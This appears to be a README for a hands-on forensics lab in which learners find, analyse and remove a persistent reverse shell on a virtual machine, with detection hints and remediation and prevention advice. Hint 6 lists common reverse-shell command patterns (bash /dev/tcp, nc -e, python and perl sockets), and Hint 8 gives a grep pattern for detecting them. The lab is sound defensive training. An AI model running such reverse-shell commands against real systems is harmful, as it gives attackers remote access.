# Reverse Shell Discovery

**Difficulty:** Intermediate
**Category:** Forensics
**Time estimate:** 30-40 minutes

## Scenario

Your network monitoring detected an unusual outbound connection from a production server to an external IP on port 4444. The connection has been active for 3 days. When you check the server, everything looks normal, but the connection persists.

Someone has established a reverse shell for persistent remote access.

## Prerequisites

- [Lima](https://lima-vm.io/) for VM management
- 2GB+ RAM free

## What You'll Learn

- Detecting reverse shells
- Network connection analysis
- Finding listening processes
- Packet capture and analysis
- Reverse shell identification
- Remediation and prevention

## Setup

```bash
./setup-lima.sh
```

## Your Task

1. SSH into the system: `limactl shell lima-revshell`
2. Find the suspicious outbound connection
3. Identify the process maintaining the connection
4. Determine how the reverse shell was established
5. Remove it and prevent reinfection

## Hints

Hint 1: List all network connections: `sudo ss -antp` or `sudo netstat -antp`. Look for ESTABLISHED connections to external IPs on unusual ports (4444, 4445, 5555, 8080, etc.).

Hint 2: Use `sudo lsof -i -P -n` to see which processes have network connections open. Look for bash, sh, nc, or python processes with network sockets.

Hint 3: Check for processes with suspicious parent processes: `ps auxf` shows process tree. A shell spawned by a network service is suspicious.

Hint 4: Examine the process: `sudo ls -la /proc/[PID]/exe` and `sudo cat /proc/[PID]/cmdline` to see what's actually running.

Hint 5: Capture network traffic to see what's being sent: `sudo tcpdump -i any -A port 4444` or check `/proc/[PID]/fd/` to see open file descriptors.

Hint 6: Common reverse shell patterns: `bash -i >& /dev/tcp/IP/PORT`, `nc -e /bin/bash IP PORT`, `python -c 'import socket...'`, or `perl -e 'use Socket;...'`.

Hint 7: Check how it starts: Look in cron (`crontab -l`, `/etc/cron*`), systemd services (`systemctl list-units`), rc.local, or .bashrc/.profile files.

Hint 8: Search for the reverse shell script: `sudo find / -type f -name "*.sh" -exec grep -l "dev/tcp\|nc.*-e\|socket" {} \; 2>/dev/null`.

Hint 9: To remediate: Kill the process, remove the reverse shell script, remove persistence mechanisms, patch the vulnerability that allowed initial access, add firewall rules to block outbound connections to suspicious ports.

Hint 10: Prevention: Egress filtering, monitor outbound connections, use SELinux/AppArmor to restrict network access, implement application whitelisting, regular security audits.

## Cleanup

```bash
./teardown-lima.sh
```

## Production Parallels

This scenario mirrors:
- Post-exploitation persistence via reverse shells
- Command and control (C2) channels
- Lateral movement after initial compromise
- Need for egress filtering
- Network behavior monitoring
- Incident response procedures
